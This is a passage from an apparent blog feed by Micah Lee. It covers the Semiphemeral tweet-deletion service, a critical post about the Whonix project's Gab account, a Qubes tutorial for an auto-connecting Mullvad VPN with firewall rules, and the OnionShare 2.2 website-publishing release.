&lt;p&gt;In the meantime, you can go over to the Settings page and configure it exactly as you like. Here's how mine is configured:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Delete tweets older than 30 days unless they have at least 20 retweets or at least 20 likes, and don't delete tweets that are part of a thread that contains at least one tweet that meets these thresholds&lt;/li&gt;
&lt;li&gt;Unretweet tweets older than 30 days and unlike tweets older than 60 days&lt;/li&gt;
&lt;li&gt;Delete direct messages older than 14 days&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="settings-screenshot.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When it's done downloading your Twitter history, @semiphemeral will send you a Twitter direct message letting you know.&lt;/p&gt;
&lt;p&gt;The next step is to go to the Tweets tab. This will show you all of the tweets that don't fit your criteria in Settings, and you can optionally exclude any of them from deletion. For example, Semiphemeral won't delete the tweet that verifies myself on the messaging app Keybase:&lt;/p&gt;
&lt;p&gt;&lt;img src="keybase-screenshot.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;After you've chosen the settings you want and chosen which tweets to manually exclude, you can go back to the Dashboard and click the "Start Semiphemeral" button. From this point on, once a day Semiphemeral will download your latest Twitter history and delete the older stuff based on your settings.&lt;/p&gt;
&lt;h1 id="deleting-direct-messages"&gt;Deleting direct messages&lt;/h1&gt;&lt;p&gt;Semiphemeral can also delete your old DMs, basically making them ephemeral (although keep in mind that when you delete a DM, the person you sent it to can still read it unless they delete it too).&lt;/p&gt;
&lt;p&gt;When you first login to Semiphemeral, you give the app permission to delete your tweets but it doesn't have access to your DMs. If you want it to delete them, first you must give it access. You can find a link to authorize Semiphemeral to access your DMs on the Settings page under "Direct messages". This time you have to agree to an additional privilege.&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter-dms-auth.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;There's another catch. Twitter only tells Semiphemeral about the last 30 days of your DMs. Because of this, Semiphemeral can't &lt;em&gt;automatically&lt;/em&gt; delete all your old DMs, only those within the last 30 days. For example, if you configure it to delete DMs older than 7 days, each time it runs it will delete the DMs between 30 days ago and 7 days ago.&lt;/p&gt;
&lt;p&gt;But if you have years and years of DMs you want to destroy, don't worry. You can still bulk delete them, you just need to give Semiphemeral a list of them. If you go to the DMs tab there's instructions on how to do this. But in short, you need to download a copy of your Twitter archive and them upload files that contain all of your historical DM metadata to Semiphemeral, and &lt;em&gt;then&lt;/em&gt; it can delete all your older ones.&lt;/p&gt;
&lt;h1 id="semiphemeral-com-doesn-t-track-you"&gt;Semiphemeral.com doesn't track you&lt;/h1&gt;&lt;p&gt;You can see Semiphemeral's extremely &lt;a href="https://semiphemeral.com/privacy"&gt;short and readable privacy policy here&lt;/a&gt;, but the TLDR is: The service doesn't use any analytics software or log IP addresses, and there are no ads. It temporarily saves the content of your tweets, but then deletes that content when it deletes those tweets. It never accesses the content of your DMs.&lt;/p&gt;
&lt;p&gt;It's hosted on the US-based cloud hosting provider DigitalOcean, and uses Stripe to process optional credit card tips.&lt;/p&gt;
&lt;h1 id="paid-for-by-tips"&gt;Paid for by tips&lt;/h1&gt;&lt;p&gt;Semiphemeral is totally free to use. I coded it in my spare time basically just because I wanted to use it myself. At the moment it's costing me roughly $60/month to pay for hosting (and if it gets considerably more popular, that amount will increase as well).&lt;/p&gt;
&lt;p&gt;If you &amp;lt;3 Semiphemeral you can help me offset these costs by tipping (you can do this from the Tip tab when you're logged in), which is greatly appreciated.&lt;/p&gt;
</content></entry><entry><title>Problematic behavior from the Whonix project</title><link href="https://micahflee.com/2020/06/is-the-whonix-project-run-by-fascists/" rel="alternate"></link><updated>2020-06-22T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:6b30113b-e583-3efe-8b4d-5142acd9b8f4</id><content type="html">&lt;p&gt;&lt;strong&gt;April 5, 2022: There is an update at the bottom of the post.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Content warning: This blog post mentions sexual assault and anti-Semitic terrorism.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The first sign that something weird was going on with the &lt;a href="https://www.whonix.org/"&gt;Whonix&lt;/a&gt; project -- software, which is integrated into the &lt;a href="https://www.qubes-os.org/"&gt;Qubes&lt;/a&gt; operating system, that allows you to run anonymous VMs that force all your internet traffic through the &lt;a href="https://www.torproject.org/"&gt;Tor network&lt;/a&gt;, run primarily by Patrick Schleizer -- was in September 2018 when the project's official Twitter account &lt;a href="https://archive.is/spckm"&gt;tweeted&lt;/a&gt;, "We miss Jacob Appelbaum."&lt;/p&gt;
&lt;p&gt;&lt;img src="whonix-tweet.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Jacob Appelbaum is a serial rapist who, in 2016, was kicked out of Tor Project and the internet freedom community after a group of his victims &lt;a href="https://www.theguardian.com/technology/2016/oct/11/jacob-appelbaum-tor-project-sexual-assault-allegations"&gt;organized to expose him&lt;/a&gt;. The link in the Whonix tweet was to a copy of Citizenfour, Laura Poitras's 2014 documentary about Edward Snowden, which featured Appelbaum before he was exposed as a sexual predator.&lt;/p&gt;
&lt;p&gt;Whonix promptly &lt;a href="https://twitter.com/Whonix/status/1041600435478573056"&gt;deleted&lt;/a&gt; the tweet, and the issue was largely forgotten.&lt;/p&gt;
&lt;p&gt;Then earlier this year someone &lt;a href="https://social.linux.pizza/@syster/103815604895181197"&gt;reached out to me&lt;/a&gt; on Mastodon, the open source federated social network, to point out that the Whonix project has an account on Gab.&lt;/p&gt;
&lt;p&gt;&lt;img src="whonix-fediverse.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Gab is a white supremacist social network which was founded in 2016 in an alt-right cesspool but really gained infamy in 2018 after it came out that Robert Bowers, the neo-Nazi that murdered 11 people in a terrorist attack at a synagogue in Pittsburgh, was an &lt;a href="https://www.usatoday.com/story/tech/nation-now/2018/10/29/gab-goes-offline-pittsburgh-synagogue-shooting/1804582002/"&gt;avid user&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Until today, I was indeed on the front page of the Whonix website (quoting an &lt;a href="https://theintercept.com/2015/09/16/getting-hacked-doesnt-bad/"&gt;article I wrote&lt;/a&gt; for the Intercept about VMs), along with Snowden and quotes from a bunch of organizations that I think might not be happy with associating with Whonix if they knew about the project's apparent fascist sympathies.&lt;/p&gt;
&lt;p&gt;&lt;img src="whonix-homepage.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Screenshot from the whonix.org homepage&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;And the footer of every page on the Whonix wiki, which is the majority of whonix.org, has a prominent link to Gab.&lt;/p&gt;
&lt;p&gt;&lt;img src="whonix-footer.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Screenshot from the footer of the Whonix wiki&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;After reading that toot (in Mastodon, tweets are called "toots") I meant to contact Patrick Schleizer and ask him what's going on with Whonix's Gab profile and see if he has an explanation, but I got busy and forgot about it until a few months later.&lt;/p&gt;
&lt;p&gt;Last month, Nina Alter, a user experience designer that works with the Qubes and SecureDrop projects, pinged me on Signal to ask some questions about Whonix. She was working on securing funding to improve Whonix's usability. When I told her about how Whonix has an account on Gab and promotes it in the footer of their website, she was quite naturally disturbed.&lt;/p&gt;
&lt;p&gt;Before writing her grant proposal, Nina wanted to get to the bottom of it. She emailed Patrick saying that the affiliation with Gab is a major concern that must be addressed before continuing with the grantwriting, but he never emailed back. Nina did not write the grant proposal.&lt;/p&gt;
&lt;p&gt;Miguel Jacq is a freelance system administrator and an &lt;a href="https://onionshare.org/"&gt;OnionShare&lt;/a&gt; developer who has been doing freelance devops work for the Whonix project for a few years. He was also recently made aware of Whonix's Gab connection, so he contacted Patrick expressing concern that Whonix was associating itself with a neo-Nazi social network, envisaging that it could harm the reputation of the project. Patrick never responded to this concern.&lt;/p&gt;
&lt;p&gt;"I find difficulty aligning my own personal ethics regarding the matter, with the merits of participating in what has otherwise been to date an important and rewarding project," Miguel told me. "I don't really believe Patrick holds any extreme right-wing views, so for me it makes no sense to have that presence on Gab. Whonix does really important work, but software is political. It's not fun as a left-wing person to have people approach me saying 'Why are you involved with that project, they seem to endorse Gab'. I can't just ignore that and say the software alone matters."&lt;/p&gt;
&lt;p&gt;Earlier this month, Miguel formally &lt;a href="https://rezo.mig5.net/@mig5/104321869006611558"&gt;stepped down&lt;/a&gt; from working with Whonix.&lt;/p&gt;
&lt;p&gt;On June 14, I wrote Patrick an encrypted email myself asking about the project's affiliation with Gab and demanding that they either stop this affiliation or remove my name and photo from the Whonix website:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Hey Patrick,&lt;/p&gt;
&lt;p&gt;A few people have pointed out to me that the footer on the Whonix wiki includes a social media link to Whonix's Gab profile. Why does Whonix have an account on an explicitly racist, neo-Nazi social network? The people who run Gab don't in any way actually give a shit about "free speech" -- it's just a transparent excuse to be able to grow their
fascist movement within liberal democracies, but luckily most people aren't falling for it.&lt;/p&gt;
&lt;p&gt;I don't feel comfortable associating with fascists or in any way supporting their movements. Can you delete the Whonix Gab account, which only has 38 followers anyway, and remove the link to Gab from the wiki? Or if you don't want to do that, can you remove my name, photo, and quote from the homepage of whonix.org?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;He never responded to my email. But last week he &lt;a href="https://github.com/Whonix/Whonix-Website/commit/a9f55ce9f2341de27e3cd74326654e7f724156cd"&gt;updated the code&lt;/a&gt; of the Whonix website to remove my quote, and today he deployed the update, so I'm no longer on the homepage anymore.&lt;/p&gt;
&lt;p&gt;I've heard from other people who work in open source digital security tools that they have also contacted Patrick and the Whonix project about this.&lt;/p&gt;
&lt;p&gt;Whonix could have possibly had a logical explanation for using and promoting Gab. Like, &lt;a href="https://forums.whonix.org/t/long-wiki-edits-thread/3477/1016"&gt;maybe&lt;/a&gt; Patrick believed the disingenuous marketing about Gab being a free speech social network rather than an explicitly neo-Nazi one.&lt;/p&gt;
&lt;p&gt;But if that were the case, he sure isn't answering anyone's questions. Instead, he's steadfastly refusing to budge or explain himself, despite funders and contractors fleeing the project because they don't want to work with fascists.&lt;/p&gt;
&lt;p&gt;==&lt;/p&gt;
&lt;h3 id="april-5-2022-update"&gt;April 5, 2022 Update&lt;/h3&gt;&lt;p&gt;After talking with Tempest (@JetBlackCloud on Twitter), I decided to change the title of this blog post from "Is the Whonix project run by fascists?" to "Problematic behavior from the Whonix project" because it's more accurate.&lt;/p&gt;
&lt;p&gt;I also wanted to provide some updates:&lt;/p&gt;
&lt;p&gt;Whonix removed a link to its Gab account from its website in late 2020. The first version of the Whonix site &lt;a href="https://web.archive.org/web/20201030071636/https://www.whonix.org/wiki/Documentation"&gt;captured by the Internet Archive&lt;/a&gt; that removed the link to Gab was on October 30, 2020, four months after this post was published. The project still technically has a &lt;a href="https://gab.com/Whonix"&gt;Gab account&lt;/a&gt; but it hasn't posted since November 20, 2021, while it still consistently posts to its &lt;a href="https://twitter.com/Whonix"&gt;Twitter account&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I'm not sure why Whonix decided to stop using Gab, but my guess is for the reason that should have been obvious from the beginning: It makes the project look bad.&lt;/p&gt;
&lt;p&gt;According to Tempest, the "We miss Jacob Appelbaum" tweet was posted by a problematic Whonix moderator called &lt;a href="https://forums.whonix.org/u/tnt_bom_bom/activity"&gt;TNT_BOM_BOM&lt;/a&gt;, which is why the tweet ended with "^TNT". That checks out. TNT also signed some of the posts to Gab. Based on his forum posts, TNT is still an active Whonix community members.&lt;/p&gt;
&lt;p&gt;Patrick never responded to me or the people I quoted in this blog post, and as far as I can tell, the Whonix project ever really responded to this at all (other than I guess eventually stop using Gab). The closest thing that can be found to a response was in this &lt;a href="https://forums.whonix.org/t/whonix-is-loosing-their-antifacist-supporters/9844"&gt;forum thread&lt;/a&gt; where the user torjunkie points out some new additions to the wiki:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Whonix added an &lt;a href="https://www.whonix.org/wiki/Warning#Unsubstantiated_Conclusions"&gt;Unsubstatiated Conclusions&lt;/a&gt; section to its wiki that says, "Users must be careful not to draw incorrect conclusions based on the existence of specific Whonix ™ communication channels, community software utilized, applications installed on the platform, or the availability of certain wiki entries."&lt;/li&gt;
&lt;li&gt;Whonix added a &lt;a href="https://www.whonix.org/wiki/Official_Online_Profiles#Selection_of_Platforms"&gt;Selection of Platforms&lt;/a&gt; section to its wiki that says that one of the "non-criteria" for picking a platform to create an account on is "ethical or political considerations," and that creating an account is not an endorsement of that social network.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I also never found any technical issues with the Whonix project. It's open source and appears to follow best practices. I don't think the problematic behavior says anything about whether or not its safe to rely on Whonix. While I think parts of Whonix are a bit over-engineered, I still use it myself inside Qubes.&lt;/p&gt;
&lt;p&gt;Gab has changed in the years since then too. It was founded by explicit neo-Nazis in the aftermath of the deadly 2017 Charlottesville fascist protest as part of the &lt;a href="https://en.wikipedia.org/wiki/Alt-tech"&gt;alt-tech&lt;/a&gt; movement, but now it's home to a more diverse far-right audience including people who aren't explicitly fascist, like MAGA/Stop the Steal/QAnon conspiracy types and anti-vaxxers.&lt;/p&gt;
</content></entry><entry><title>Using Mullvad VPN in Qubes</title><link href="https://micahflee.com/2019/11/using-mullvad-in-qubes/" rel="alternate"></link><updated>2019-11-01T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:0428d637-9e62-3635-8efc-7aaa4329dd8f</id><content type="html">&lt;p&gt;A friend wanted my help configuring &lt;a href="https://mullvad.net/en/"&gt;Mullvad VPN&lt;/a&gt; on their Qubes computer. Instead of just helping them, I decided to write a quick blog post explaining how I normally set up VPNs in Qubes. There are many different ways -- Mullvad even has its own &lt;a href="https://mullvad.net/en/help/qubes-os-4-and-mullvad-vpn/"&gt;Qubes guide&lt;/a&gt; -- but I prefer using NetworkManager system tray applets, so I can always see if my VPN is connected or not. I also use a simple script that I set to run when my AppVM boots to automatically connect to the VPN, and reconnect if it disconnects, and Qubes firewall rules to prevent non-VPN internet traffic from sneaking by.&lt;/p&gt;
&lt;p&gt;First, create a new VM called &lt;code&gt;vpn-mullvad&lt;/code&gt;. Use the latest Fedora template you have (&lt;code&gt;fedora-30&lt;/code&gt; in my case), and make sure to set networking to &lt;code&gt;sys-firewall&lt;/code&gt; and not &lt;code&gt;default (sys-firewall)&lt;/code&gt;. Finally, check both the "provides network" and "launch settings after creation" boxes. ("Provides network" means this new VM will be able to provide internet access to other VMs.)&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-create.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When the &lt;code&gt;vpn-mullvad&lt;/code&gt; settings open, switch to the "Services" tab and add a service called &lt;code&gt;network-manager&lt;/code&gt;, and click ok. This will make it so that when this VM boots up, you'll have a NetworkManager system tray applet in the top-right corner of your screen.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-services.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now, open a web browser in a disposable VM (click the Qubes menu, then &lt;code&gt;Disposable: fedora-30-dvm&lt;/code&gt;, &lt;code&gt;fedora-30-dvm: Firefox&lt;/code&gt;), and &lt;a href="https://mullvad.net/en/account/login/"&gt;login&lt;/a&gt; to your Mullvad account at mullvad.net. Once you're logged in, go to Mullvad's &lt;a href="https://mullvad.net/en/download/config/"&gt;OpenVPN configuration file generator&lt;/a&gt;. Set your platform to &lt;code&gt;Linux&lt;/code&gt;, choose a location, and make sure to check &lt;code&gt;Use IP addresses&lt;/code&gt;. Then click download. (In my case, since I'm setting up this VPN to go to Canada, I'm downloading the file &lt;code&gt;mullvad_config_linux_ca.zip&lt;/code&gt;.)&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-openvpn-config-generator.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now open a file manager in your disposable VM that contains the file you just downloaded.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-open-folder.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;And copy it to your &lt;code&gt;vpn-mullvad&lt;/code&gt; VM. (This will probably boot that VM for the first time.)&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-copy1.png" alt=""&gt;
&lt;img src="qubes-mullvad-copy2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now open a file manager in your &lt;code&gt;vpn-mullvad&lt;/code&gt; VM (click the Qubes menu, &lt;code&gt;Service: vpn-mullvad&lt;/code&gt;, &lt;code&gt;vpn-mullvad: Files&lt;/code&gt;). Navigate to the &lt;code&gt;QubesIncoming&lt;/code&gt; folder, then the folder inside that that's the name of your disposable VM (in my case, &lt;code&gt;disp9309&lt;/code&gt;). You should see the zip file with the Mullvad OpenVPN config. Right-click on it and choose "Extract Here". Then drag the extracted folder (&lt;code&gt;mullvad_config_linux_ca&lt;/code&gt;, in my case) to &lt;code&gt;Documents&lt;/code&gt;. Then, navigate inside this folder, and you should see your VPN config files.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-files.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Also, you might notice that when your &lt;code&gt;vpn-mullvad&lt;/code&gt; VM booted up, there is a new NetworkManager applet in your system tray. Click on it, go to &lt;code&gt;VPN Connections&lt;/code&gt;, &lt;code&gt;Add a VPN connection...&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-systray.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Then choose &lt;code&gt;Import a saved VPN configuration...&lt;/code&gt; from the dropdown list, and click Create.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-import-vpn1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Then browse for the Mullvad &lt;code&gt;.conf&lt;/code&gt; file in your &lt;code&gt;Documents&lt;/code&gt; folder.&lt;/p&gt;
&lt;p&gt;Back in your file manager, double click on &lt;code&gt;mullvad_userpass.txt&lt;/code&gt; -- this will should you what to put into the username and password fields.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-import-vpn2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Then click save. This will popup a window asking you to choose a password for the default keyring -- you can just leave it blank and click continue, and click continue again to confirm you want to store passwords unencrypted. (Everything on your computer is actually encrypted with full disk encryption, and you won't be running any other software in this VM that could access these files.)&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-keyring-password.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now you should be able to click the &lt;code&gt;vpn-mullvad&lt;/code&gt; NetworkManager system tray icon, click &lt;code&gt;VPN Connections&lt;/code&gt;, and connect to the new VPN you just added. It should attempt to connect, and if all goes well you should see a notification that says, "VPN connection has been successfully established," and the NetworkManager icon should have a little lock next to it.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-connect.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now, let's make this VPN automatically connect whenever it boots up. Open a terminal in &lt;code&gt;vpn-mullvad&lt;/code&gt; (click Qubes, &lt;code&gt;Service: vpn-mullvad&lt;/code&gt;, &lt;code&gt;vpn-mullvad: Terminal&lt;/code&gt;), and run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo gedit /rw/config/autovpn.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will open up a blank file using gedit (feel free to use whatever text editor you prefer). Copy and paste this script into it. You may need to change the line that says &lt;code&gt;nmcli con up mullvad_ca&lt;/code&gt; to use the name of the VPN config that you added, assuming you chose a location other than Canada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
while [ "true" ]
do
  if nmcli con |grep -Fq tun0
  then
    echo "Already connected, sleeping 5"
    sleep 5
  else
    echo "Connecting"
    nmcli con up mullvad_ca
  fi
done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then save this file and quit the editor. This script basically checks to see if you're connected to the VPN. If you are, it waits 5 seconds and checks again. If you're not, it connects you to the VPN. And it loops forever -- so that if you ever get disconnected, it will detect this and automatically reconnect.&lt;/p&gt;
&lt;p&gt;Back in your terminal, make it executable:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo chmod +x /rw/config/autovpn.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And now edit your &lt;code&gt;rc.local&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo gedit /rw/config/rc.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Add &lt;code&gt;sudo -u user /rw/config/autovpn.sh &amp;amp;&lt;/code&gt; to the end of this file, and save and exit.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-rclocal.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;rc.local&lt;/code&gt; script, which gets run every time the VM boots up, will now run the &lt;code&gt;autovpn.sh&lt;/code&gt; script in the background.&lt;/p&gt;
&lt;p&gt;Go ahead and try it out! Power off the &lt;code&gt;vpn-mullvad&lt;/code&gt; VM (click the Qubes logo in the system tray, then &lt;code&gt;vpn-mullvad&lt;/code&gt;, &lt;code&gt;Shutdown&lt;/code&gt;), and then power it on again (you can open the file manager in that VM again). The VPN should automatically connect.&lt;/p&gt;
&lt;p&gt;Now, let's prevent some leaks. It's common for programs on your computer to try to do stuff on the internet while your VPN isn't connected -- maybe it hasn't connected yet, or it got disconnected for some reason. We can use Qubes firewall rules to prevent the &lt;code&gt;vpn-mullvad&lt;/code&gt; from communicating with anything except for the VPN servers that it's configured to connect to, so if (for example) your VPN gets disconnected but you have a web browser open, your browser won't load anything from your real IP address -- that traffic will get dropped by the firewall.&lt;/p&gt;
&lt;p&gt;In a file manager in &lt;code&gt;vpn-mullvad&lt;/code&gt;, go to the folder that contains your Mullvad OpenVPN config files, and open the &lt;code&gt;.conf&lt;/code&gt; file. You'll see a list of lines that start with &lt;code&gt;remote&lt;/code&gt; -- these are the various OpenVPN servers that Mullvad is configured to try connecting to. (In my case, these are in Montreal, Toronto, and Vancouver.)&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-remotes.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now open the settings for &lt;code&gt;vpn-mullvad&lt;/code&gt; (click the Qubes menu, go to &lt;code&gt;Service: vpn-mullvad&lt;/code&gt;, &lt;code&gt;vpn-mullvad: Qubes Settings&lt;/code&gt;) and switch to the "Firewall rules" tab. You can add a new rule to allow each of these IP addresses through, and blocking all other IPs.&lt;/p&gt;
&lt;p&gt;But before we do, a quick note about Qubes firewall rules. For some reason, Qubes seems to choke if you have too many of them (more than maybe 20). So for example, if you set up Mullvad to choose servers in the US, then there will be way too many servers in the list. So, before proceeding, delete some of them from this file to bring it down to a more managable number of servers. If you do this, make sure to delete your VPN in NetworkManager and then add it again.&lt;/p&gt;
&lt;p&gt;And also a quick note on copy and paste. There's no easy way to copy something from a VM and then paste it into &lt;code&gt;dom0&lt;/code&gt;. There are good security reasons for this, but it will make this tedious work. So if you want to copy and paste, you can actually just view this file directly from &lt;code&gt;dom0&lt;/code&gt;. Open a terminal in &lt;code&gt;dom0&lt;/code&gt; (click the Qubes menu, and open &lt;code&gt;Terminal Emulator&lt;/code&gt;). Then run this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;qvm-run --pass-io vpn-mullvad 'cat ~/Documents/mullvad_*/*.conf' | grep "remote "
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will show you all of the &lt;code&gt;remote&lt;/code&gt; lines from your OpenVPN config file, but inside your &lt;code&gt;dom0&lt;/code&gt; terminal, and you &lt;em&gt;can&lt;/em&gt; copy from this window to paste into the Qubes firewall rules.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-remotes-dom0.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now, back in the &lt;code&gt;vpn-mullvad&lt;/code&gt; settings window, in the firewall rules tab, select "Limit outgoing Internet connections to ...". Then click the plus button, and add a rule for each IP address, copying and pasting from the &lt;code&gt;dom0&lt;/code&gt; terminal if you'd like. It's fine to set the protocol to "Any" for each rule.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-firewall.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When you click ok, you're done setting up &lt;code&gt;vpn-mullvad&lt;/code&gt;! It uses the NetworkManager applet, it automatically connects if it gets disconnected, and thanks to the firewall rules, as long as you set &lt;code&gt;vpn-mullvad&lt;/code&gt; as your networking VM, none of your downstream VMs will make any internet connections that don't go through the VPN you just set up.&lt;/p&gt;
&lt;p&gt;If you want all of your VMs use Mullvad by default, open Qubes Global Settings (Qubes menu, &lt;code&gt;System Tools&lt;/code&gt;, &lt;code&gt;Qubes Global Settings&lt;/code&gt;) and change "Default netVM" from &lt;code&gt;sys-firewall&lt;/code&gt; to &lt;code&gt;vpn-mullvad&lt;/code&gt; and click ok.&lt;/p&gt;
&lt;p&gt;And finally, you may want the ability to open a browser window while not using a VPN -- like, if you connect to a public wifi network and need to click through a captive portal. I solve this problem by making a disposable VM template specifically for this purpose.&lt;/p&gt;
&lt;p&gt;Open the settings for &lt;code&gt;fedora-30-dvm&lt;/code&gt; (Qubes menu, &lt;code&gt;Displable: fedora-30-dvm&lt;/code&gt;, &lt;code&gt;fedora-30-dvm: Qube Settings&lt;/code&gt;) and click "Clone qube" -- rename this clone to &lt;code&gt;fedora-30-clearnet-dvm&lt;/code&gt;. Now open the settings for &lt;code&gt;fedora-30-clearnet-dvm&lt;/code&gt;, and change "Networking" from &lt;code&gt;default (vpn-mullvad)&lt;/code&gt; to &lt;code&gt;sys-firewall&lt;/code&gt;, and click ok.&lt;/p&gt;
&lt;p&gt;Now, if you need to click through a captive portal, you can just open a browser in a &lt;code&gt;fedora-30-clearnet-dvm&lt;/code&gt; disposable VM to click through it, and as soon as you have internet &lt;code&gt;vpn-mullvad&lt;/code&gt; will automatically connect to Mullvad, and internet will start working on in the rest of your VMs.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-mullvad-connected.png" alt=""&gt;&lt;/p&gt;
</content></entry><entry><title>New version of OnionShare makes it easy for anyone to publish anonymous, uncensorable websites</title><link href="https://micahflee.com/2019/10/new-version-of-onionshare-makes-it-easy-for-anyone-to-publish-anonymous-uncensorable-websites/" rel="alternate"></link><updated>2019-10-13T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:ec378978-9428-3cc8-addf-f8d4cb80f515</id><content type="html">&lt;p&gt;I’m excited to announce that OnionShare 2.2 is released! You can download it from &lt;a href="https://onionshare.org/"&gt;onionshare.org&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When I first wrote OnionShare in 2014, it let you anonymously and securely send files to people. It worked like this: OnionShare zips up the files, starts a local web server on your computer with a link to this zip file, makes this website accessible as a Tor onion service, and shows you the URL of the web server. You send someone this .onion URL, they load it in Tor Browser (loading the website hosted directly on your computer), and then they can download the zip file. As soon as the download is complete, OnionShare shuts down the web service.&lt;/p&gt;
&lt;p&gt;In the years since then it has gotten a whole lot better (largely thanks to a &lt;a href="https://github.com/micahflee/onionshare/wiki/Developing-OnionShare"&gt;growing community&lt;/a&gt; of volunteer contributors). Instead of just sending files, you can use it to receive files now, allowing you to turn your computer into an &lt;a href="https://micahflee.com/2019/02/onionshare-2/"&gt;anonymous dropbox&lt;/a&gt;. But it has always worked the same way: hosting an anonymous website locally on your computer. But since OnionShare hosts a website on your computer anyway, why not use it to &lt;em&gt;host actual websites&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-website-mode.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;In addition to the “Share Files” and “Receive Files” tabs, OnionShare 2.2 introduces the “Publish Website” tab. You drag all of the files that make up your website into the OnionShare window and click “Start sharing.” It will start a web server to host your static website and give you a .onion URL. This website is only accessible from the Tor network, so people will need Tor Browser to visit it. People who visit your website will have no idea who you are – they won’t have access to your IP address, and they won’t know your identity or your location. And, so long as your website visitors are able to access the Tor network, the website can’t be censored.&lt;/p&gt;
&lt;p&gt;Here are some things to keep in mind about how website publishing in OnionShare works:&lt;/p&gt;
&lt;p&gt;If any folder in the website that you’re sharing includes an &lt;code&gt;index.html&lt;/code&gt; file, then when someone loads that folder in Tor Browser it will load that html file. If any folder doesn’t include an &lt;code&gt;index.html&lt;/code&gt; file, it will show a directory listing instead. So you could, for example, publish a website that’s just a bunch of files without any html, and people who load it in Tor Browser will able to browse your files and folders and download individual files.&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-directory-listing.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When sharing something that’s not public, OnionShare now uses HTTP basic authentication. So the URLs that you share look like &lt;code&gt;http://onionshare:[password]@[address].onion&lt;/code&gt; now. When someone loads the URL in Tor Browser, it will ask them if they want to login first, like this:&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-basic-auth.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When they click OK, the URL in the address bar no longer contains the &lt;code&gt;onionshare:[password]&lt;/code&gt; part, and just looks like a normal website. (This protects against shoulder surfing, where an attacker looks at someone’s screen to see the OnionShare URL and visit it themselves.)&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-basic-auth-loaded.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;If you want to publish your website for anyone to see, you can always go to settings and enable “public mode”, which simply doesn’t use a username and password anymore.&lt;/p&gt;
